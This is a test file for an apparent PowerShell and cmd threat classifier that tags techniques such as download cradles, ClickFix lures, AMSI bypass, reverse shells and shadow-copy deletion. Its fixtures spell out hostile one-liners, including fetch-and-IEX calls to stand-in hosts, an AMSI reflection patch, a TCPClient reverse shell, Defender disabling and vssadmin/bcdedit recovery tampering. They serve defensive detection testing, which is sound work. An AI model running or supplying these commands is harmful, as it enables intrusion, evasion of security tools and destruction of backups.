import { describe, expect, it } from 'vitest'
import { buildContext, classify } from '../techniques'
import { preprocess } from '../preprocess'

function analyze(text: string, raw = text) {
  const pre = preprocess(raw)
  return classify(buildContext(text, pre.flags, pre.interpreter))
}
const ids = (text: string, raw = text) => analyze(text, raw).map((s) => s.id)
const specOf = (text: string, id: string, raw = text) =>
  analyze(text, raw).find((s) => s.id === id)?.specificity
// Shared helper (established here for later tasks 13/14/15/17 to reuse):
// classify/buildContext directly, no preprocess() pass — a plain-corpus
// signature check independent of interpreter detection or evasion-flag lexing.
const sig = (s: string) => classify(buildContext(s, [], 'unknown')).map((x) => x.id)

describe('download cradle', () => {
  it('fires when fetched content flows into an interpreter', () => {
    const sigs = analyze("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    const c = sigs.find((s) => s.id === 'download-cradle')
    expect(c).toBeTruthy()
    expect(c!.techniqueIds).toContain('T1105')
    expect(c!.trigger).toBeTruthy()
  })

  it('benign twin: download to a FILE (no IEX sink) does NOT fire', () => {
    expect(ids("Invoke-WebRequest https://example.com/data.json -OutFile data.json"))
      .not.toContain('download-cradle')
  })
})

describe('evasion-flag clustering', () => {
  it('fires on a 3+ evasion-flag cluster carrying an -enc payload', () => {
    const raw = "powershell -nop -w hidden -ep bypass -enc SQBFAFgA"
    expect(ids('IEX $x', raw)).toContain('evasion-cluster')
  })

  it('benign twin: evasion cluster running a LOCAL -File script does NOT fire', () => {
    const raw = "powershell -nop -w hidden -ExecutionPolicy Bypass -File C:\\ops\\backup.ps1"
    expect(ids('Get-ChildItem', raw)).not.toContain('evasion-cluster')
  })

  it('the -File discriminator is load-bearing: the same cluster+payload fires, and a -File in the corpus suppresses it', () => {
    const raw = 'powershell -nop -w hidden -ep bypass' // 3-flag cluster, no -File
    const payload = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    // cluster>=3 AND payload (fetch+IEX sink) AND no -File -> fires
    expect(ids(payload, raw)).toContain('evasion-cluster')
    // same cluster+payload, but a -File mention in the corpus -> localFile suppresses it
    expect(ids('-File C:\\ops\\job.ps1 ; ' + payload, raw)).not.toContain('evasion-cluster')
  })
})

describe('co-occurrence upgrade', () => {
  it('bumps evasion-cluster weak -> strong when a download cradle co-fires', () => {
    const raw = "powershell -nop -w hidden -ep bypass -enc AAAA"
    const script = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    expect(specOf(script, 'evasion-cluster', raw)).toBe('strong')
  })
})

describe('determinism / ordering', () => {
  it('returns signals in a stable rule order', () => {
    const a = ids("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    const b = ids("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    expect(a).toEqual(b)
  })
})

describe('AMSI / ETW / Defender tampering', () => {
  it('AMSI reflection patch is near-dispositive on its own', () => {
    const s = analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
    const a = s.find((x) => x.id === 'amsi-reflection')
    expect(a).toBeTruthy()
    expect(a!.specificity).toBe('near-dispositive')
  })

  it('AMSI memory patch (AmsiScanBuffer + VirtualProtect) is near-dispositive', () => {
    const s = analyze("$p = VirtualProtect $addr 0x1000 0x40 ([ref]$old); ... AmsiScanBuffer patch")
    expect(s.find((x) => x.id === 'amsi-memory-patch')?.specificity).toBe('near-dispositive')
  })

  it('Defender cmdlet tampering stays STRONG (installer/GPO benign twin exists)', () => {
    const s = analyze("Set-MpPreference -DisableRealtimeMonitoring $true")
    const d = s.find((x) => x.id === 'defender-tamper')
    expect(d).toBeTruthy()
    expect(d!.specificity).toBe('strong')
  })

  it('benign twin: a legitimate Add-MpPreference exclusion by itself is only STRONG, never near-dispositive', () => {
    const s = analyze("Add-MpPreference -ExclusionPath 'C:\\Program Files\\VendorApp'")
    const nd = s.filter((x) => x.specificity === 'near-dispositive')
    expect(nd).toHaveLength(0)
  })

  it('ETW tampering fires (strong)', () => {
    const s = analyze("[Reflection.Assembly]::Load(...); EtwEventWrite patched via reflection")
    expect(s.find((x) => x.id === 'etw-tamper')?.specificity).toBe('strong')
  })

  it('benign twin: a plain ETW/EventProvider diagnostics reference (no patch primitive) does NOT fire', () => {
    expect(ids('New-Object System.Diagnostics.Eventing.EventProvider($guid); EtwEventWrite')).not.toContain('etw-tamper')
  })
})

describe('ClickFix / paste-and-run', () => {
  it('fires on a hidden-window one-liner carrying a fake-verification lure that fetches and IEXes', () => {
    const raw = "powershell -nop -w hidden -c IEX (iwr http://evil.test/x).Content"
    const text = "verify you are human, then paste this to continue: IEX (iwr http://evil.test/x).Content"
    expect(ids(text, raw)).toContain('clickfix')
  })
  it('fires on conhost --headless powershell', () => {
    expect(ids("conhost --headless powershell -nop -c iex(irm http://x.test/a)"))
      .toContain('clickfix')
  })
  it('benign twin: a plain hidden -File task does NOT fire', () => {
    const raw = "powershell -w hidden -nop -File C:\\ops\\job.ps1"
    expect(ids('Get-Date', raw)).not.toContain('clickfix')
  })
  it('benign twin: a hidden-window -File deployment that fetches+IEXes internally does NOT fire (file exec, not paste-and-run)', () => {
    const raw = 'powershell -nop -w hidden -File C:\\ops\\deploy.ps1'
    const text = "-File C:\\ops\\deploy.ps1 ; IEX (New-Object Net.WebClient).DownloadString('http://mirror.local/pkg')"
    expect(ids(text, raw)).not.toContain('clickfix')
  })
  it('fires on mshta launching a remote .hta', () => {
    expect(ids('mshta https://evil.test/x.hta')).toContain('clickfix')
  })
  it('fires on a CAPTCHA/verify-human decoy paired with a downloader', () => {
    expect(ids("# verify you are human - ray id 8f2 #; IEX (iwr http://evil.test/x).Content")).toContain('clickfix')
  })
  it('benign twin: gpg --verify (routine signature verification) does NOT fire — a bare --verify needs real ClickFix context', () => {
    expect(ids('gpg --verify sig.asc release.tar')).not.toContain('clickfix')
  })
})

describe('ClickFix trait-gating (review 2.4)', () => {
  it('a plain -enc/-nop/-w download cradle is NOT ClickFix', () => {
    expect(sig("powershell -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://x/a')")).not.toContain('clickfix')
  })
  // The above uses sig(), which never runs preprocess() and so never
  // populates ctx.flags — it can't exercise the -w/-nop-flag path at all.
  // This one drives that path for real via ids()/preprocess(), which is the
  // actual over-fire the review reported: a hidden -nop -w cradle with no
  // lure must read as download-cradle only, never clickfix.
  it('a real hidden -nop -w cradle (flags via preprocess, no lure) reads as download-cradle only, not ClickFix', () => {
    const raw = "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    const text = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    expect(ids(text, raw)).toContain('download-cradle')
    expect(ids(text, raw)).not.toContain('clickfix')
  })
  it('a real fake-CAPTCHA lure IS ClickFix', () => {
    expect(sig("# verify you are human, press win+r\npowershell -nop -w hidden IEX (iwr http://x/a)")).toContain('clickfix')
  })
  it('conhost --headless still fires ClickFix', () => {
    expect(sig('conhost --headless powershell -enc AAAA')).toContain('clickfix')
  })
})

describe('beaconing + reverse shell + loaders + persistence', () => {
  it('beaconing: jittered sleep loop + same-host fetch', () => {
    expect(ids("while($true){ Start-Sleep (Get-Random -Min 30 -Max 90); IEX (New-Object Net.WebClient).DownloadString('http://c2.test/t') }"))
      .toContain('beaconing')
  })
  it('reverse-shell: TCPClient stream feeding IEX is near-dispositive', () => {
    const s = analyze("$c=New-Object Net.Sockets.TCPClient('10.0.0.5',4444);$s=$c.GetStream();IEX $data")
    expect(s.find((x) => x.id === 'reverse-shell')?.specificity).toBe('near-dispositive')
  })
  it('fileless-loader: VirtualAlloc + CreateThread on a byte array', () => {
    expect(ids("$b=[byte[]](0x90,0x90); $a=VirtualAlloc 0 $b.Length 0x3000 0x40; CreateThread 0 0 $a 0 0 0"))
      .toContain('fileless-loader')
  })
  it('persistence: Register-ScheduledTask fires (strong)', () => {
    const s = analyze("Register-ScheduledTask -TaskName Updater -Action $a -Trigger $t")
    expect(s.find((x) => x.id === 'persistence')?.specificity).toBe('strong')
  })
  it('benign twin: a bare Start-Sleep with no loop/fetch is not beaconing', () => {
    expect(ids("Start-Sleep -Seconds 5")).not.toContain('beaconing')
  })
  it('persistence fires as a FACT on a routine scheduled task but stays strong (cannot characterize alone)', () => {
    const s = analyze('Register-ScheduledTask -TaskName NightlyBackup -Action $a -Trigger $t')
    const p = s.find((x) => x.id === 'persistence')
    expect(p).toBeTruthy()
    expect(p!.specificity).toBe('strong')
  })
  it('benign twin: Add-Type compiling C# WITHOUT an alloc/inject primitive does NOT fire fileless-loader', () => {
    expect(ids("Add-Type -TypeDefinition 'public class N { public static int F(){return 1;} }'"))
      .not.toContain('fileless-loader')
  })
})

describe('LOLBin surfaces through classify', () => {
  it('emits a lolbin signal naming the binary', () => {
    const s = analyze("certutil.exe -urlcache -split -f http://45.9.148.20/a.exe a.exe")
    const l = s.find((x) => x.id === 'lolbin')
    expect(l).toBeTruthy()
    expect(l!.label.toLowerCase()).toContain('certutil')
  })
})

describe('WSH honesty signals', () => {
  it('the unconditional WSH-limits notice fires for interpreter in {mshta, wscript, cscript} regardless of corpus content', () => {
    expect(ids('C:\\Users\\Public\\a.vbs', 'wscript C:\\Users\\Public\\a.vbs')).toContain('wsh-decode-limits')
    const wshCtx = buildContext('Chr(72)&Chr(105)', [], 'mshta')
    expect(classify(wshCtx).map((s) => s.id)).toContain('wsh-decode-limits')
  })

  it('the concat/eval presence-detector fires on VBScript concat, JScript concat, and Execute/eval', () => {
    expect(classify(buildContext('"po" & "wershell"', [], 'wscript')).map((s) => s.id)).toContain('wsh-concat-eval-present')
    expect(classify(buildContext('"a"+"b"', [], 'cscript')).map((s) => s.id)).toContain('wsh-concat-eval-present')
    expect(classify(buildContext('Execute("malicious")', [], 'mshta')).map((s) => s.id)).toContain('wsh-concat-eval-present')
  })

  it('neither WSH honesty signal fires for a plain PowerShell input (interpreter-gated)', () => {
    const sigs = classify(buildContext('"a" & "b" ; Execute("x")', [], 'powershell')).map((s) => s.id)
    expect(sigs).not.toContain('wsh-decode-limits')
    expect(sigs).not.toContain('wsh-concat-eval-present')
  })
})

describe('cmd-cradle', () => {
  it('fires on a for /f loop wrapping a download/exec inner command (finger)', () => {
    const s = analyze("for /f %e in ('finger user@45.9.148.20') do %e", "cmd /c for /f %e in ('finger user@45.9.148.20') do %e")
    const c = s.find((x) => x.id === 'cmd-cradle')
    expect(c).toBeTruthy()
    expect(c!.techniqueIds).toEqual(expect.arrayContaining(['T1059.003', 'T1105']))
  })

  it('fires on a for /f loop wrapping a nested powershell payload', () => {
    expect(ids("for /f %e in ('powershell -enc AAAA') do %e")).toContain('cmd-cradle')
  })

  it('benign twin: for /f alone (no download/exec inner command) does NOT fire', () => {
    expect(ids("for /f %i in ('dir /b') do echo %i")).not.toContain('cmd-cradle')
  })

  it('benign twin: for /f parsing robocopy/reg query output does NOT fire (FP pressure test)', () => {
    expect(ids('for /f "tokens=3" %a in (\'reg query HKCU\\Software /v Ver\') do echo %a')).not.toContain('cmd-cradle')
    expect(ids('for /f %f in (\'robocopy C:\\src C:\\dst /L\') do echo %f')).not.toContain('cmd-cradle')
  })

  it('co-occurrence upgrade: cmd-cradle + a broadened ClickFix decoy upgrades cmd-cradle to near-dispositive', () => {
    const script = "for /f %e in ('finger user@45.9.148.20') do %e & echo --Verify... press ENTER to continue"
    expect(specOf(script, 'cmd-cradle')).toBe('near-dispositive')
  })
})

describe('broadened ClickFix decoy phrases', () => {
  it('fires on "--Verify... press ENTER" style decoys from the live-test sample', () => {
    expect(ids('echo --Verify... press ENTER to continue')).toContain('clickfix')
  })
})

describe('mshta interpreter-aware rule', () => {
  it('fires when interpreter is mshta with a URL target', () => {
    const s = classify(buildContext('http://evil.test/x.hta', [], 'mshta'))
    const m = s.find((x) => x.id === 'mshta-interpreter')
    expect(m).toBeTruthy()
    expect(m!.techniqueIds).toContain('T1218.005')
  })

  it('dual-tags T1059.005 when the discriminator is an inline vbscript: scheme', () => {
    const s = classify(buildContext('vbscript:CreateObject("WScript.Shell").Run("calc.exe")', [], 'mshta'))
    const m = s.find((x) => x.id === 'mshta-interpreter')
    expect(m!.techniqueIds).toEqual(expect.arrayContaining(['T1218.005', 'T1059.005']))
  })

  it('benign twin: mshta with no URL/.hta/inline-script discriminator does NOT fire', () => {
    const s = classify(buildContext('about:blank', [], 'mshta'))
    expect(s.map((x) => x.id)).not.toContain('mshta-interpreter')
  })
})

describe('wscript/cscript script-execution rule', () => {
  it('fires on wscript launching a .vbs from a suspicious path with //E:', () => {
    const s = classify(buildContext('C:\\Users\\Public\\payload.vbs', [{ flag: '//E:vbscript', raw: '//E:vbscript', techniqueIds: ['T1059.005'] }], 'wscript'))
    const w = s.find((x) => x.id === 'wsh-script-exec')
    expect(w).toBeTruthy()
    expect(w!.techniqueIds).toContain('T1059.005')
  })

  it('fires on cscript launching a .js from a suspicious AppData path', () => {
    const s = classify(buildContext('C:\\Users\\bob\\AppData\\Roaming\\dropper.js', [], 'cscript'))
    expect(s.map((x) => x.id)).toContain('wsh-script-exec')
  })

  it('benign twin: wscript launching a .vbs from a trusted path with no //E: flag does NOT fire', () => {
    const s = classify(buildContext('C:\\Program Files\\LegitApp\\installer.vbs', [], 'wscript'))
    expect(s.map((x) => x.id)).not.toContain('wsh-script-exec')
  })
})

describe('T1490 shadow/recovery tamper (review 2.4)', () => {
  it('fires on vssadmin delete shadows', () => {
    expect(sig('vssadmin delete shadows /all /quiet')).toContain('shadow-recovery-tamper')
  })
  it('fires on vssadmin resize shadowstorage', () => {
    expect(sig('vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB')).toContain('shadow-recovery-tamper')
  })
  it('fires on wmic shadowcopy delete', () => {
    expect(sig('wmic shadowcopy delete')).toContain('shadow-recovery-tamper')
  })
  it('fires on wbadmin delete catalog', () => {
    expect(sig('wbadmin delete catalog -quiet')).toContain('shadow-recovery-tamper')
  })
  it('fires on wbadmin delete systemstatebackup', () => {
    expect(sig('wbadmin delete systemstatebackup -deleteoldest')).toContain('shadow-recovery-tamper')
  })
  it('fires on bcdedit recoveryenabled no', () => {
    expect(sig('bcdedit /set {default} recoveryenabled no')).toContain('shadow-recovery-tamper')
  })
  it('fires on bcdedit bootstatuspolicy ignoreallfailures', () => {
    expect(sig('bcdedit /set {default} bootstatuspolicy ignoreallfailures')).toContain('shadow-recovery-tamper')
  })
  it('is near-dispositive on its own', () => {
    expect(specOf('vssadmin delete shadows /all /quiet', 'shadow-recovery-tamper')).toBe('near-dispositive')
  })
  it('trigger is a real substring of the input — never fabricated, even for the non-first discriminators (resize-shadowstorage and bootstatuspolicy cases)', () => {
    const resizeInput = 'vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB'
    const resizeSignal = classify(buildContext(resizeInput, [], 'unknown')).find((s) => s.id === 'shadow-recovery-tamper')
    expect(resizeSignal).toBeTruthy()
    expect(resizeInput.toLowerCase()).toContain(resizeSignal!.trigger.toLowerCase())

    const bcdInput = 'bcdedit /set {default} bootstatuspolicy ignoreallfailures'
    const bcdSignal = classify(buildContext(bcdInput, [], 'unknown')).find((s) => s.id === 'shadow-recovery-tamper')
    expect(bcdSignal).toBeTruthy()
    expect(bcdInput.toLowerCase()).toContain(bcdSignal!.trigger.toLowerCase())
  })
  it('does NOT fire on a benign vssadmin list shadows', () => {
    expect(sig('vssadmin list shadows')).not.toContain('shadow-recovery-tamper')
  })
  it('does NOT fire on a benign wbadmin get status', () => {
    expect(sig('wbadmin get status')).not.toContain('shadow-recovery-tamper')
  })
  it('does NOT fire on a bare bcdedit query with no destructive object', () => {
    expect(sig('bcdedit /enum')).not.toContain('shadow-recovery-tamper')
  })
})

describe('download-to-disk-then-exec dropper (review 2.2)', () => {
  it('fires on DownloadFile + Start-Process', () => {
    expect(sig("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe")).toContain('disk-dropper')
  })
  it('fires on -OutFile + Invoke-Item', () => {
    expect(sig("Invoke-WebRequest http://e/a.exe -OutFile a.exe; Invoke-Item a.exe")).toContain('disk-dropper')
  })
  it('fires on certutil -urlcache -split to-disk + a bare .exe run', () => {
    expect(sig('certutil -urlcache -split -f http://x.test/a.exe a.exe & a.exe')).toContain('disk-dropper')
  })
  it('does NOT fire on a bare download to disk with no exec', () => {
    expect(sig("Invoke-WebRequest http://e/update.zip -OutFile update.zip")).not.toContain('disk-dropper')
  })
  it('does NOT fire on a bare exec with no fetch to disk', () => {
    expect(sig('Start-Process notepad.exe')).not.toContain('disk-dropper')
  })
  it('review fix (a): does NOT fire when the fetching tool\'s own fully-qualified name sits at corpus position 0 — a `^`-anchored .exe token is never an exec sink, only a separator-anchored one is', () => {
    expect(sig('certutil.exe -urlcache -split -f http://x.test/a.exe destination.exe')).not.toContain('disk-dropper')
    expect(sig('powershell.exe -Command "iwr http://e/a.exe -OutFile a.exe"')).not.toContain('disk-dropper')
  })
  it('review fix (a) regression: a genuinely separator-anchored bare .exe run (`& a.exe`) still fires', () => {
    expect(sig('certutil -urlcache -split -f http://x.test/a.exe a.exe & a.exe')).toContain('disk-dropper')
  })
  it('review fix (b): does NOT fire on a benign fetch-to-disk whose corpus merely contains "ascii" (Out-File -Encoding ascii) — the bare \'ii \' substring needle used to collide with it', () => {
    expect(sig('certutil -urlcache -split -f http://x.test/a.exe a.exe; Out-File -Encoding ascii report.txt')).not.toContain('disk-dropper')
  })
  it('review fix (b) regression: the genuine Invoke-Item alias (a separator-anchored `& ii ...` call-operator form) still fires', () => {
    expect(sig("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); & ii a.exe")).toContain('disk-dropper')
  })
  it('is STRONG on its own (a dropper has a benign-installer twin)', () => {
    expect(specOf("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe", 'disk-dropper')).toBe('strong')
  })
  it('trigger is a real substring of the input — including when neither side fires via its FIRST-listed literal needle (certutil to-disk + bare .exe run, the Task 12 lesson: no fabricated needles[0] fallback)', () => {
    const input = 'certutil -urlcache -split -f http://x.test/a.exe a.exe & a.exe'
    const s = classify(buildContext(input, [], 'unknown')).find((x) => x.id === 'disk-dropper')
    expect(s).toBeTruthy()
    expect(input.toLowerCase()).toContain(s!.trigger.toLowerCase())
  })
  it('co-occurrence upgrade: disk-dropper + evasion-cluster upgrades disk-dropper to near-dispositive', () => {
    const raw = 'powershell -nop -w hidden -ep bypass -enc AAAA'
    const script = "(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe"
    expect(specOf(script, 'disk-dropper', raw)).toBe('near-dispositive')
  })
})
